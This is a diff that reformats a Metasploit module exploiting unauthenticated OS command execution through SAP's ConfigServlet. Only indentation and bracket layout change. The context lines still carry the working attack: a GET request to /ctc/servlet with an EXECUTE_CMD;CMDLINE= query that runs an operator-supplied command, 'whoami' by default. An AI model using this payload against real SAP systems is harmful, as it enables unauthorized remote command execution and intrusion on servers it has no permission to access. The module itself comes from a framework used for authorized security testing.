@@ -7,33 +7,35 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'            => 'SAP ConfigServlet OS Command Execution',
-      'Description'     => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'SAP ConfigServlet OS Command Execution',
+        'Description' => %q{
           This module allows execution of operating system commands through the SAP
-        ConfigServlet without any authentication.
-      },
-      'Author'          =>
-        [
+          ConfigServlet without any authentication.
+        },
+        'Author' => [
           'Dmitry Chastuhin', # Vulnerability discovery (based on the reference presentation)
           'Andras Kabai' # Metasploit module
         ],
-      'License'         => MSF_LICENSE,
-      'References'      =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'OSVDB', '92704' ],
           [ 'EDB', '24963' ],
           [ 'URL', 'http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf']
         ],
-      'DisclosureDate' => '2012-11-01' # Based on the reference presentation
-    ))
+        'DisclosureDate' => '2012-11-01'
+      )
+    ) # Based on the reference presentation
 
     register_options(
       [
         Opt::RPORT(50000),
         OptString.new('CMD', [ true, 'The command to execute', 'whoami']),
         OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/ctc/servlet'])
-      ])
+      ]
+    )
   end
 
   def run
@@ -46,7 +48,8 @@ class MetasploitModule < Msf::Auxiliary
           'uri' => uri,
           'method' => 'GET',
           'query' => 'param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + Rex::Text::uri_encode(datastore['CMD'])
-        })
+        }
+      )
       if !res or res.code != 200
         print_error("#{rhost}:#{rport} - Exploit failed")
         return
